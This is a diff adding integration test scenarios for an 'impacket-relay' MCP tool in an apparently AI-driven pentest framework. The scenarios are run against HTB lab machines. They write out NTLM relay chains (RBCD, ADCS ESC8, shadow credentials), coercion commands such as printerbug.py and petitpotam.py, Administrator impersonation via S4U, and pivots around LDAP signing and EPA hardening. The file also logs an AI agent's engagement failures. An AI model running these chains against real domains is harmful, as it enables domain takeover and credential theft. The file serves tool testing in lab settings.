@@ -1,0 +1,726 @@
+# Integration Scenarios: impacket-relay
+# Required HTB Machines: Pirate (RBCD relay), Certified (ADCS relay/ESC8),
+#                        Escape (ADCS + shadow creds), Authority (ADCS ESC7+ESC8),
+#                        Garfield (RBCD relay -- recent stuck-state regression test)
+# Prerequisites: VPN connected, target DC IP reachable, valid AD credentials,
+#                coercion mechanism available (PetitPotam, PrinterBug, WebDAV)
+# Run with: pytest tests/tools/test_impacket_relay.py -m integration --tool=impacket-relay \
+#           --target=<DC_IP> -v
+
+# =============================================================================
+# RBCD RELAY ATTACK CHAIN (coerce + relay + S4U2Self/Proxy)
+# =============================================================================
+# Full chain: add machine account -> start relay -> coerce auth -> check status ->
+#             stop relay -> get service ticket -> psexec with ticket
+
+## Scenario 1: Start RBCD relay listener
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Expected: success=true, relay_id set, status="running", listen_port=80, delegate_access=true
+Notes: Listens on HTTP port 80 for coerced NTLM auth. Auto-adds --no-smb-server.
+       Target must be LDAPS (not LDAP) if LDAP signing is enforced.
+HTB Box: Pirate (ldaps://DC01.pirate.htb)
+
+## Scenario 2: Check relay status (before coercion)
+Method: status
+Args: {relay_id: <from Scenario 1>}
+Expected: success=true, status="running", connections=[], relay_succeeded=false
+Notes: No connections yet. Relay is listening and waiting.
+
+## Scenario 3: Check relay status (after coercion triggers)
+Method: status
+Args: {relay_id: <from Scenario 1>}
+Expected: success=true, connections list populated, relay_succeeded=true, delegation_written=true
+Notes: Run PetitPotam/PrinterBug/WebDAV coercion between Scenario 2 and 3.
+       On Pirate: impacket.petitpotam or WebDAV coercion from WEB01 to our listener.
+       Verify "Connection from" and "Delegation written successfully" in raw_output.
+HTB Box: Pirate (coerce DC01 via PetitPotam)
+
+## Scenario 4: Stop relay and collect results
+Method: stop
+Args: {relay_id: <from Scenario 1>}
+Expected: success=true, status="stopped", relay_succeeded=true, delegation_written=true,
+          connections list non-empty, errors may be empty or contain non-fatal warnings
+Notes: After stop, port 80 should be freed for reuse. Check raw_output for full ntlmrelayx log.
+
+## Scenario 5: Post-relay S4U ticket request
+# NOT an impacket-relay test -- use impacket tool
+Method: (impacket) get_st
+Args: {target: <DC_IP>, username: "MCPTEST01$", password: <machine_pass>, domain: <DOMAIN>,
+       dc_ip: <DC_IP>, spn: "cifs/<DC_FQDN>", impersonate: "Administrator"}
+Expected: success=true, ccache_exists=true
+Notes: Uses the RBCD delegation written by relay. Machine account from addcomputer.
+       This validates the complete attack chain end-to-end.
+
+## Scenario 5b: RBCD relay with LDAP (not LDAPS) -- LDAP signing enforced
+Method: start
+Args: {target: "ldap://<DC_IP>", listen_port: 9090, delegate_access: true, timeout: 120}
+Expected: Relay starts successfully. After coercion:
+          status shows error_class="config", errors contain "StrongerAuthRequired" or "LDAP signing"
+Notes: LDAP signing is enforced on all modern AD DCs. The relay starts fine but the actual
+       NTLM relay to LDAP fails. This is the #1 misconfiguration seen in engagements.
+       Pirate engagement: agent started with ldap://10.129.9.217 first, wasted 30+ min
+       before switching to LDAPS. The relay itself doesn't validate; the error only appears
+       at relay time when coerced auth arrives.
+Evidence: [Pirate ses_30bd2eab] first start used ldap:// at 02:21, didn't get results,
+          switched to ldaps:// at 11:07.
+HTB Box: Any modern AD box -- Pirate, Garfield, Escape
+
+# =============================================================================
+# RBCD RELAY FULL CHAIN (coercion -> relay -> S4U -- end to end)
+# =============================================================================
+# This section documents the full RBCD chain as it actually plays out in
+# engagements. The chain has 6 sequential steps, each of which can fail.
+
+## Scenario 5c: Full RBCD chain step 1 -- addcomputer (pre-relay)
+# NOT an impacket-relay method -- use impacket.addcomputer
+Method: (impacket) addcomputer
+Args: {dc_ip: <DC_IP>, domain: <DOMAIN>, username: <USER>, password: <PASS>,
+       computer_name: "RELAY01$", computer_pass: "Relay2026!"}
+Expected: success=true
+Notes: MachineAccountQuota must be >= 1. If quota is 0, need GenericAll/GenericWrite
+       on an existing computer object for direct RBCD write without machine account.
+       On Pirate: pentest/MS01$ both had quota access.
+
+## Scenario 5d: Full RBCD chain step 2 -- start relay listener
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true, timeout: 600}
+Expected: success=true, relay_id set, status="running"
+Notes: Use LDAPS. Set timeout=600 (10 min) -- coercion may take multiple attempts.
+       If the relay will be triggered via WebDAV, use port 80. If via PrinterBug
+       pointing to our SMB, use listen_port=445, no_http_server=true.
+
+## Scenario 5e: Full RBCD chain step 3 -- trigger coercion
+# NOT an impacket-relay method -- use PetitPotam / PrinterBug / WebDAV
+Method: (coercer) printerbug OR (coercer) petitpotam
+Args: {target: <VICTIM_IP>, listener: <ATTACKER_IP>:<PORT>, domain: <DOMAIN>,
+       username: <USER>, password: <PASS>}
+Expected: Coercion triggers NTLM auth to our relay listener.
+Notes: PrinterBug (MS-RPRN) > PetitPotam (MS-EFSR) on patched systems.
+       Pirate insight: PetitPotam was patched on WEB01 but PrinterBug worked first try.
+       Use PowerShell-native coercion scripts to avoid AV detection on target.
+       WebDAV coercion from WEB01 was also effective (forces HTTP NTLM, works with port 80).
+
+## Scenario 5f: Full RBCD chain step 4 -- verify relay success
+Method: status
+Args: {relay_id: <from step 2>}
+Expected: success=true, relay_succeeded=true, delegation_written=true,
+          connections list contains "Connection from <VICTIM_IP>"
+Notes: If connections=[] after coercion: coercion failed silently (check coercer output).
+       If connections non-empty but delegation_written=false: relayed account lacks write
+       access to msDS-AllowedToActOnBehalfOfOtherIdentity (check ACLs via bloodhound).
+
+## Scenario 5g: Full RBCD chain step 5 -- stop relay
+Method: stop
+Args: {relay_id: <from step 2>}
+Expected: success=true, status="stopped"
+Notes: ALWAYS stop relay before proceeding to S4U. Port must be freed.
+
+## Scenario 5h: Full RBCD chain step 6 -- S4U to get service ticket
+# NOT an impacket-relay method -- use impacket.get_st
+Method: (impacket) get_st
+Args: {dc_ip: <DC_IP>, domain: <DOMAIN>, spn: "cifs/<TARGET_FQDN>",
+       impersonate: "Administrator", username: "RELAY01$", password: "Relay2026!"}
+Expected: success=true, ccache file generated
+Notes: On Pirate: RELAY01$ -> S4U2Self -> S4U2Proxy -> cifs/WEB01.pirate.htb as Administrator
+       Then use impacket.psexec or impacket.smbexec with -k -no-pass and the ccache.
+       If S4U fails with KDC_ERR_BADOPTION: RBCD write didn't include S4U2Self delegation,
+       or the impersonated user is in "Protected Users" group.
+
+# =============================================================================
+# ADCS RELAY (ESC8 -- relay NTLM to CA web enrollment)
+# =============================================================================
+
+## Scenario 6: Start ADCS relay listener
+Method: start
+Args: {target: "http://<CA_FQDN>/certsrv/certfnsh.asp", listen_port: 80,
+       adcs: true, adcs_template: "DomainController"}
+Expected: success=true, relay_id set, status="running"
+Notes: ADCS ESC8 relay. Target is the CA's HTTP enrollment endpoint.
+       Template must be enrollable by the relayed account (DomainController for machine accounts).
+HTB Box: Certified (http://CERTIFIED-DC01-CA.certified.htb/certsrv/certfnsh.asp)
+         Escape (http://sequel-DC-CA.sequel.htb/certsrv/certfnsh.asp)
+         Authority (http://authority-CA.authority.htb/certsrv/certfnsh.asp)
+
+## Scenario 6b: Start ADCS relay targeting LDAPS (not HTTP enrollment)
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, adcs: true,
+       adcs_template: "DomainController"}
+Expected: success=true, relay_id set, status="running"
+Notes: Alternative ESC8 path: relay to LDAPS if CA web enrollment is disabled or
+       not reachable. ntlmrelayx --adcs with LDAPS target uses LDAP to submit the
+       certificate request programmatically rather than via HTTP POST.
+       Testing session used this pattern with ldaps://10.129.231.186 on port 8080.
+Evidence: [Testing ses_2c72ea51] started with target: "ldaps://10.129.231.186",
+          adcs: true, adcs_template: "DomainController", listen_port: 8080
+
+## Scenario 7: ADCS relay status after successful coercion
+Method: status
+Args: {relay_id: <from Scenario 6>}
+Expected: success=true, adcs_succeeded=true, relay_succeeded=true,
+          raw_output contains "Certificate generated" or "Certificate saved"
+Notes: After coercion, ntlmrelayx relays the auth to the CA and requests a certificate.
+       Look for .pfx file reference in output (saved to /session/relay/ on stop).
+
+## Scenario 8: Stop ADCS relay and collect certificate
+Method: stop
+Args: {relay_id: <from Scenario 6>}
+Expected: success=true, status="stopped", adcs_succeeded=true,
+          artifacts list contains .pfx file (if attack succeeded)
+Notes: Certificate is saved to /session/relay/. Use with certipy auth to get TGT.
+
+## Scenario 8b: ADCS relay post-exploitation -- authenticate with certificate
+# NOT an impacket-relay method -- use certipy.auth
+Method: (certipy) auth
+Args: {pfx: "/session/relay/<account>.pfx", domain: <DOMAIN>, dc_ip: <DC_IP>}
+Expected: success=true, TGT obtained, NT hash extracted via U2U
+Notes: Certipy auth performs PKINIT with the .pfx certificate to get a TGT,
+       then U2U to extract the NT hash. The NT hash can be used for pass-the-hash.
+       If PKINIT fails with KDC_ERR_PADATA_TYPE_NOSUPP: DC doesn't support PKINIT
+       (needs Windows Server 2016+ with AD CS configured).
+
+## Scenario 9: ADCS relay with wrong template (error scenario)
+Method: start
+Args: {target: "http://<CA_FQDN>/certsrv/certfnsh.asp", listen_port: 80,
+       adcs: true, adcs_template: "NonExistentTemplate"}
+Expected: Relay starts (template check happens at relay time, not start time).
+          After coercion: status shows errors with "template" mentioned.
+Notes: Tests error classification for bad template. error_class should be "config".
+
+## Scenario 9b: ADCS relay with EPA (Extended Protection for Authentication)
+Method: start
+Args: {target: "https://<CA_FQDN>/certsrv/certfnsh.asp", listen_port: 80,
+       adcs: true, adcs_template: "DomainController"}
+Expected: Relay starts. After coercion: relay fails with EPA/channel binding error.
+Notes: When the CA web enrollment uses HTTPS with EPA enabled, NTLM relay fails
+       because the channel binding token doesn't match (relay creates a new TLS session).
+       This is the ESC8 mitigation. Error should contain "channel binding" or similar.
+       error_class should be "config".
+       Agent should recognize this and suggest ESC11 (ICPR) if available, or direct
+       certipy auth with existing credentials.
+
+# =============================================================================
+# SHADOW CREDENTIALS RELAY
+# =============================================================================
+
+## Scenario 10: Start shadow credentials relay
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, shadow_credentials: true}
+Expected: success=true, relay_id set, status="running"
+Notes: Adds msDS-KeyCredentialLink to the relayed account's target.
+       Requires target DC to support PKINIT (Windows Server 2016+).
+HTB Box: Escape (ldaps://dc.sequel.htb) -- if user has GenericWrite on computer object
+
+## Scenario 11: Shadow credentials status after coercion
+Method: status
+Args: {relay_id: <from Scenario 10>}
+Expected: success=true, shadow_credentials_succeeded=true, relay_succeeded=true,
+          raw_output contains "KeyCredentialLink" and "added" or "updated"
+Notes: After successful relay, use certipy auth with the generated PFX for PKINIT.
+
+## Scenario 11b: Shadow credentials relay -- PKINIT not supported
+Method: status (after coercion on a DC that doesn't support PKINIT)
+Args: {relay_id: <from Scenario 10>}
+Expected: Relay may succeed (KeyCredentialLink written) but post-exploitation fails.
+          raw_output may or may not show errors -- the write succeeds, but auth with
+          the resulting PFX fails at PKINIT time.
+Notes: Shadow credentials write =/= exploitation. The write targets msDS-KeyCredentialLink
+       on the computer object, which requires GenericWrite. But even if the write succeeds,
+       PKINIT must be supported by the DC for the PFX to be usable.
+       Agent must verify PKINIT support BEFORE investing in shadow credentials relay.
+       Check: certipy find --vulnerable or ldapsearch for NTAuthCertificates.
+
+## Scenario 11c: Shadow credentials relay -- existing KeyCredentialLink
+Method: status
+Args: {relay_id: <from Scenario 10>}
+Expected: Relay may fail if the target object already has a KeyCredentialLink entry
+          and the relayed account lacks permissions to modify it (append vs replace).
+Notes: ntlmrelayx --shadow-credentials uses MODIFY_REPLACE by default. If an existing
+       DeviceID entry exists from prior shadow cred attacks, the replace overwrites it.
+       If the target has a protected/read-only KCL (e.g., hybrid-joined device), the
+       write fails with error_class="permission".
+
+## Scenario 12: Stop shadow credentials relay
+Method: stop
+Args: {relay_id: <from Scenario 10>}
+Expected: success=true, status="stopped", shadow_credentials_succeeded=true
+
+## Scenario 12b: Shadow credentials post-exploitation chain
+# NOT an impacket-relay method -- use certipy + impacket
+# Step 1: certipy auth with generated PFX -> TGT + NT hash
+# Step 2: impacket.get_st with S4U2Self if needed
+# Step 3: Use NT hash for pass-the-hash
+Notes: Shadow credentials relay generates a PFX file on stop. The PFX is for the
+       machine account whose auth was relayed (e.g., DC01$ if coerced from DC).
+       Use certipy auth -pfx <file>.pfx -domain <DOMAIN> to get the machine account
+       TGT and NT hash. Machine hash enables secretsdump, RBCD chains, etc.
+
+# =============================================================================
+# MULTI-RELAY MANAGEMENT (start/status/stop lifecycle)
+# =============================================================================
+
+## Scenario 13: Start multiple relays on different ports
+Method: start (x2)
+Args 1: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Args 2: {target: "ldaps://<DC_FQDN>", listen_port: 8080, delegate_access: true}
+Expected: Both return success=true with different relay_ids
+Notes: Useful when coercing from multiple sources or using different protocols.
+
+## Scenario 13b: Start RBCD relay + ADCS relay simultaneously
+Method: start (x2)
+Args 1: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Args 2: {target: "http://<CA_FQDN>/certsrv/certfnsh.asp", listen_port: 8080,
+         adcs: true, adcs_template: "DomainController"}
+Expected: Both return success=true with different relay_ids (relay-1, relay-2)
+Notes: Run parallel relay attacks. Coerce one target; both relays receive the auth.
+       The RBCD relay targets LDAPS, the ADCS relay targets the CA. One coercion
+       event triggers auth to our listener. ntlmrelayx with multiple targets in
+       a single process is the standard approach, but our MCP server runs separate
+       processes. Agent must coerce to port 80 for RBCD and port 8080 for ADCS
+       (coerce twice, once per listener).
+
+## Scenario 13c: Start relays on same port with different attack types
+Method: start (x2)
+Args 1: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Args 2: {target: "ldaps://<DC_FQDN>", listen_port: 80, shadow_credentials: true}
+Expected: First succeeds. Second fails with error_class="network" (port in use).
+Notes: Cannot run two relays on the same port. Agent should stop the first relay
+       before starting a different attack on the same port.
+
+## Scenario 14: Status all running relays
+Method: status (x2)
+Args: {relay_id: <relay-1>}, {relay_id: <relay-2>}
+Expected: Both return status="running" independently
+Notes: Each relay has its own process and output log.
+
+## Scenario 15: Stop one relay, verify other still running
+Method: stop (relay-1), then status (relay-2)
+Expected: stop returns success. status of relay-2 still "running".
+Notes: Verifies relays are independent -- stopping one doesn't affect others.
+
+## Scenario 16: Stop remaining relay
+Method: stop (relay-2)
+Expected: success=true, status="stopped"
+
+# =============================================================================
+# STUCK STATE RECOVERY (force_restart)
+# =============================================================================
+# These scenarios address the Pirate engagement bug: 30+ minutes wasted on
+# stuck relay processes that didn't respond to status/stop.
+#
+# ROOT CAUSE (from engagement data):
+# The original mcp-server.py used asyncio.create_subprocess_exec with pipes.
+# When ntlmrelayx produced large output (many connections, verbose errors),
+# the stdout pipe filled and blocked the process. Since the MCP event loop
+# was also reading stdin for new requests, the deadlock was:
+#   ntlmrelayx blocked writing stdout -> MCP server blocked reading pipe ->
+#   MCP server can't process new status/stop requests -> everything stuck.
+#
+# FIX (current implementation):
+# subprocess.Popen with file-based output (not pipes), start_new_session=True,
+# 10s timeout on status(), 20s timeout on stop() with SIGKILL escalation.
+#
+# ENGAGEMENT EVIDENCE:
+# Pirate (2026-03-16):
+#   - 02:21 start(ldap://), 02:30 status OK, 03:14 status TIMEOUT 30s,
+#     03:21 status TIMEOUT 600s, 03:31 stop TIMEOUT 600s, 03:41 start TIMEOUT 600s
+#   - Container entered unrecoverable stuck state. MCP socket eventually died.
+#   - Agent retried start 6x (10:05-10:08), all timed out. Circuit breaker kicked in.
+#   - After container restart at 11:07: started successfully with ldaps://
+#   - Second stuck state at 11:41: status TIMEOUT 600s, stop TIMEOUT 30s
+#   - "Not connected" errors from 12:02-12:09 (container MCP socket dead)
+#   - Total time wasted: ~66 min across two stuck cycles
+# Pirate (earlier session, 2026-03-15):
+#   - Same pattern: start OK, status OK, status TIMEOUT 600s, start TIMEOUT 600s
+# Garfield (2026-04-08):
+#   - STILL HITTING THE BUG: stop TIMEOUT 662s, start TIMEOUT 662s
+#   - This confirms the stuck state issue persists in the current build
+# Testing (2026-03-29):
+#   - ADCS relay: start OK, status OK, stop failed (0ms!), start TIMEOUT 662s
+#   - Container reconnect after 4 "Not connected" failures: start OK, stop OK
+
+## Scenario 17: force_restart after stuck relay
+Method: force_restart
+Args: {}
+Expected: success=true, killed >= 0, status="cleared"
+Notes: Kills ALL relay processes. Use when status() or stop() time out.
+       After force_restart, all relay_ids are invalidated.
+
+## Scenario 18: Verify cleanup after force_restart
+Method: status (with any previously valid relay_id)
+Expected: isError=true, "not found" in error text
+Notes: All state is cleared after force_restart.
+
+## Scenario 19: Start fresh relay after force_restart
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Expected: success=true, new relay_id assigned
+Notes: Server should be fully operational after force_restart.
+
+## Scenario 20: REQ-RES-004 -- status timeout protection
+# Simulate by starting relay, manually killing the process, then checking status
+Method: status
+Expected: Returns within 10 seconds (not 600s like Pirate engagement bug).
+          If process is dead/zombie, returns status="exited" or "stuck" with force-kill.
+Notes: Critical regression test for the Pirate engagement fix.
+
+## Scenario 21: REQ-RES-005 -- stop timeout with SIGKILL escalation
+Method: stop
+Expected: Returns within 20 seconds even if process is unresponsive.
+          status="force-killed" if SIGTERM didn't work.
+Notes: Tests the SIGKILL escalation path (5s SIGTERM wait -> SIGKILL).
+
+## Scenario 21b: Cascading stuck state -> "Not connected" recovery
+# Full reproduction of the Pirate engagement failure cascade
+Method: start, let it get stuck, attempt stop (times out), then start again
+Expected: After stuck state:
+          - stop times out (20s with current fix, was 600s without fix)
+          - Next start may fail with "Not connected" if container MCP socket is dead
+          - force_restart should recover the server
+          - If force_restart also fails: container needs full restart (Docker restart)
+Notes: The "Not connected" error means the MCP stdio connection between opensploit
+       and the container is dead. This happens when:
+       (a) The stuck ntlmrelayx process consumed all container memory
+       (b) The MCP server's event loop deadlocked on pipe I/O
+       (c) The container was OOMKilled
+       Agent should recognize "Not connected" as a terminal state and request
+       container restart, NOT retry the same MCP call.
+Evidence: [Pirate] 12:02-12:09: 5 "Not connected" errors in a row.
+          [Testing] 22:36-22:39: 4 "Not connected" errors, then reconnected at 22:41.
+
+## Scenario 21c: Circuit breaker engagement (3 failures -> SKIP)
+Method: start (x4, all failing due to stuck state)
+Expected: 1st-3rd calls: timeout or error. 4th call: SKIPPED with message
+          "has failed 3 times. Use update_engagement_state({ resetToolFailures: true })"
+Notes: The circuit breaker is an opensploit client-side feature, not a server feature.
+       After 3 consecutive failures, the tool is auto-skipped to prevent infinite loops.
+       Recovery: update_engagement_state({ resetToolFailures: true }) or use
+       tool_registry_search to find an alternative (exploit-runner.run_python with
+       ntlmrelayx.py directly).
+Evidence: [Pirate] 10:08: SKIPPED after 3 failures (start at 10:05, 10:05, 10:06 all timeout)
+
+# =============================================================================
+# COERCION TRIGGER INTEGRATION (PetitPotam, PrinterBug, WebDAV)
+# =============================================================================
+# These scenarios document the relay+coercion interplay. The coercion is NOT
+# performed by impacket-relay itself, but the relay result depends on it.
+# When a dedicated coercer MCP tool exists, update these with specific tool calls.
+
+## Scenario 28: RBCD relay with PrinterBug coercion (MS-RPRN)
+Method: start, then coerce via PrinterBug, then status
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Coercion: printerbug.py <USER>:<PASS>@<VICTIM_IP> <ATTACKER_IP>
+Expected: status shows connections from <VICTIM_IP>, relay_succeeded=true,
+          delegation_written=true
+Notes: PrinterBug (MS-RPRN/SpoolSample) works on any DC running Print Spooler.
+       On Pirate: PrinterBug worked first try even though PetitPotam was patched.
+       PrinterBug triggers authentication from the machine account of the target,
+       which is then relayed to write RBCD delegation.
+       Coercion target port: SMB (445) on the victim sends auth to our HTTP (80).
+HTB Box: Pirate (Print Spooler running on WEB01)
+
+## Scenario 29: RBCD relay with PetitPotam coercion (MS-EFSR)
+Method: start, then coerce via PetitPotam, then status
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Coercion: petitpotam.py <ATTACKER_IP> <VICTIM_IP> -u <USER> -p <PASS> -d <DOMAIN>
+Expected: If PetitPotam is not patched: same as Scenario 28.
+          If patched: coercion fails silently, relay status shows connections=[]
+Notes: PetitPotam uses MS-EFSR EfsRpcOpenFileRaw (opnum 0). Fully patched since
+       KB5005413 (August 2021 + later patches). Most modern HTB boxes have it patched.
+       Agent should try PrinterBug first, then PetitPotam, then DFSCoerce.
+       When PetitPotam fails, it does NOT produce an error in the relay -- the relay
+       just never receives a connection. Agent must check relay status AND coercer output.
+Evidence: [Pirate insight-7] PetitPotam patched, PrinterBug worked.
+
+## Scenario 30: RBCD relay with WebDAV coercion
+Method: start, then coerce via WebDAV, then status
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Coercion: Set up WebDAV share pointing to \\<ATTACKER_IP>@80\share, trigger target
+          to access it (UNC path injection, search connector, etc.)
+Expected: status shows connections from <VICTIM_IP>, relay_succeeded=true
+Notes: WebDAV coercion forces HTTP NTLM authentication (not SMB), which means:
+       1. It bypasses SMB signing requirements
+       2. It works against targets that block outbound SMB (445)
+       3. The target must have the WebClient service running (usually workstations,
+          sometimes enabled on servers via "webclient" service or SearchIndexer)
+       On Pirate: WebDAV from WEB01 was effective because WebClient was running.
+       WebDAV coercion is preferred when the target blocks outbound SMB.
+
+## Scenario 31: ESC8 relay with PrinterBug coercion to CA
+Method: start, then coerce DC to authenticate to our relay, relay to CA
+Args: {target: "http://<CA_FQDN>/certsrv/certfnsh.asp", listen_port: 80,
+       adcs: true, adcs_template: "DomainController"}
+Coercion: printerbug.py <USER>:<PASS>@<DC_IP> <ATTACKER_IP>
+Expected: status shows adcs_succeeded=true, certificate obtained for DC$ account
+Notes: Classic ESC8: coerce the DC -> relay to CA HTTP enrollment -> get DC cert ->
+       PKINIT for DC$ TGT -> secretsdump DCSync.
+       The template must allow machine accounts to enroll (DomainController template
+       does by default). If using "Machine" template: check enrollment permissions.
+HTB Box: Certified, Escape, Authority
+
+## Scenario 32: Shadow credentials relay with DFSCoerce (MS-DFSNM)
+Method: start, then coerce via DFSCoerce, then status
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, shadow_credentials: true}
+Coercion: dfscoerce.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <VICTIM_IP>
+Expected: If successful: shadow_credentials_succeeded=true
+Notes: DFSCoerce targets the DFS service (MS-DFSNM). Less commonly patched than
+       PetitPotam but requires the DFS service to be running.
+       Combined with shadow credentials: coerce machine auth -> write KCL -> PKINIT.
+       This is the cleanest chain when RBCD quota is exhausted or delegate-access
+       doesn't work (no MachineAccountQuota).
+
+## Scenario 33: Relay with no coercion received (agent diagnostic)
+Method: start, wait 60s, status, stop
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true, timeout: 120}
+Expected: status shows connections=[], relay_succeeded=false. stop succeeds.
+Notes: This is the most common "failure" pattern. The relay is working correctly --
+       no coercion was triggered, or coercion targeted the wrong listener address.
+       Agent should check:
+       1. Is the coercion targeting our IP:port? (not localhost, not wrong port)
+       2. Is there a firewall between victim and attacker blocking the callback?
+       3. Did the coercion itself succeed? (check coercer tool output)
+       4. Is the victim's outbound traffic restricted? (block outbound SMB/HTTP)
+       On Pirate: First status showed connections=[] because coercion hadn't been
+       triggered yet. Second status showed connections populated.
+
+# =============================================================================
+# CLOCK SKEW SCENARIOS
+# =============================================================================
+# Kerberos has a 5-minute clock tolerance. When the attacker machine and DC have
+# significant clock differences, S4U tickets obtained after relay may fail.
+# The impacket-relay container supports FAKETIME via entrypoint.sh.
+
+## Scenario 34: Relay with Kerberos clock skew (positive offset)
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Setup: Set CLOCK_OFFSET=+300 in container environment (via ContainerManager envOverrides)
+Expected: Relay itself succeeds (NTLM, not Kerberos). But post-relay S4U may fail
+          with KRB_AP_ERR_SKEW if the offset exceeds 5 minutes.
+Notes: The relay uses NTLM, so clock skew doesn't affect the relay step. But the
+       post-relay steps (S4U2Self, S4U2Proxy) use Kerberos, which IS clock-sensitive.
+       The container uses libfaketime (installed in Dockerfile) to compensate.
+       FAKETIME environment variable is set by entrypoint.sh from CLOCK_OFFSET.
+       Agent should measure clock offset before relay (impacket.get_tgt shows offset
+       in error, or NTP query) and set CLOCK_OFFSET accordingly.
+
+## Scenario 35: Relay with extreme clock skew (>5 minutes)
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Setup: CLOCK_OFFSET=+600 (10 minutes ahead)
+Expected: Relay NTLM step works. S4U Kerberos step fails with KRB_AP_ERR_SKEW.
+Notes: If the container doesn't have FAKETIME set and the host clock is off by >5min,
+       ALL Kerberos-based post-relay operations fail. This is especially common on
+       HTB machines where the VPN tunnel introduces NTP sync issues.
+       Fix: set CLOCK_OFFSET on the impacket-relay container AND on the impacket
+       container used for S4U. Both must match the DC's clock.
+
+## Scenario 36: Clock skew detection via relay output
+Method: status (after coercion)
+Args: {relay_id: <from start>}
+Expected: If ntlmrelayx encounters clock skew during LDAP bind (when it uses Kerberos
+          internally for LDAPS): error contains "KRB_AP_ERR_SKEW" or "Clock skew"
+Notes: ntlmrelayx itself may use Kerberos for the LDAPS connection to the target DC.
+       When this happens, clock skew affects the relay step, not just post-relay.
+       Error parsing in _classify_relay_error should detect this.
+       Current code does NOT classify KRB_AP_ERR_SKEW -- this is a gap.
+       Should be classified as error_class="config", retryable=true,
+       suggestion="Set CLOCK_OFFSET environment variable to match DC clock"
+
+# =============================================================================
+# ERROR SCENARIOS
+# =============================================================================
+
+## Scenario 22: Port conflict
+Method: start (x2 on same port)
+Args 1: {target: "ldap://10.0.0.1", listen_port: 80}
+Args 2: {target: "ldap://10.0.0.2", listen_port: 80}
+Expected: First succeeds, second fails with error_class="network", retryable=false
+Notes: Tests pre-flight port check. Error should suggest using different port or force_restart.
+
+## Scenario 23: LDAP signing enforced
+Method: start, then coerce
+Args: {target: "ldap://<DC_FQDN>", listen_port: 80}
+Expected: After coercion, status shows error_class="config",
+          errors contain "LDAP signing" or "StrongerAuthRequired"
+Notes: Happens when targeting LDAP (not LDAPS) on hardened DCs.
+       Suggestion should recommend LDAPS with --remove-mic.
+HTB Box: Most modern HTB AD boxes enforce LDAP signing.
+
+## Scenario 23b: LDAP channel binding enforced
+Method: start, then coerce
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80}
+Expected: After coercion, status shows error_class="config",
+          errors contain "channel binding" or similar
+Notes: LDAP channel binding (EPA) prevents NTLM relay to LDAPS even with --remove-mic.
+       This is the strictest LDAP hardening. When both signing AND channel binding
+       are enforced, relay to LDAP/LDAPS is impossible.
+       Agent should pivot to: (a) relay to other services (HTTP, MSSQL, SMB),
+       (b) ESC8 (relay to CA HTTP enrollment), or (c) shadow credentials via LDAPS
+       (which may still work depending on EPA configuration).
+
+## Scenario 24: Access denied on relay target
+Method: start + coerce with low-privilege account
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Expected: After coercion, status shows error_class="permission",
+          errors contain "STATUS_ACCESS_DENIED"
+Notes: Relayed account doesn't have write access to msDS-AllowedToActOnBehalfOfOtherIdentity.
+
+## Scenario 24b: Access denied -- MachineAccountQuota exhausted
+Method: start + coerce
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80, delegate_access: true}
+Expected: After coercion, status shows errors about machine account creation failure.
+          Relay succeeded (NTLM relayed to LDAPS) but --delegate-access failed because
+          addcomputer failed (MachineAccountQuota=0).
+Notes: --delegate-access automatically creates a machine account AND writes RBCD.
+       If the account quota is exhausted, the machine account creation fails.
+       The error may show "ENTRYALREADYEXISTS" or "insufficientAccessRights".
+       Agent should pre-create the machine account with a separate impacket.addcomputer
+       call and use --escalate-user instead of --delegate-access.
+
+## Scenario 25: Auth failure on relay target
+Method: start + coerce
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80}
+Expected: After coercion, status shows error_class="auth",
+          errors contain "STATUS_LOGON_FAILURE" or "invalidCredentials"
+Notes: Relayed credentials were rejected by the target service.
+
+## Scenario 26: No connections received (timeout)
+Method: start, wait, status, stop
+Args: {target: "ldap://10.0.0.1", listen_port: 80}
+Expected: status shows connections=[], relay_succeeded=false
+Notes: No coercion was triggered. Relay just sat listening.
+       Agent should recognize no connections and investigate coercion path.
+
+## Scenario 26b: Connection received but relay failed (SMB signing required)
+Method: start, then coerce to relay to SMB
+Args: {target: "smb://<DC_FQDN>", listen_port: 80}
+Expected: After coercion: connections list populated but relay_succeeded=false.
+          Errors contain "signing" or "SMB_SIGNING_REQUIRED".
+Notes: When relaying to SMB on a DC, SMB signing is required by default.
+       NTLM relay to SMB fails because the signature check fails.
+       Agent should relay to LDAP/LDAPS instead, or use --remove-mic for cross-protocol.
+
+## Scenario 26c: Connection from unexpected source
+Method: start, then status
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 80}
+Expected: connections list contains entries from an IP that was NOT coerced.
+Notes: In real engagements, other machines on the network may stumble onto the relay
+       listener (especially on port 80). These are noise connections. Agent should
+       identify which connections are from the coerced target vs noise.
+       The relay may succeed with the noise connection if it has sufficient privileges,
+       which is actually a useful opportunistic attack.
+
+## Scenario 27: Cross-protocol relay with --remove-mic
+Method: start
+Args: {target: "ldaps://<DC_FQDN>", listen_port: 445, remove_mic: true, no_http_server: true}
+Expected: success=true, relay listening on SMB port 445
+Notes: Used for SMB-to-LDAPS cross-protocol relay. Remove MIC required for cross-protocol.
+       Tests the --smb-port flag path (listen_port=445).
+
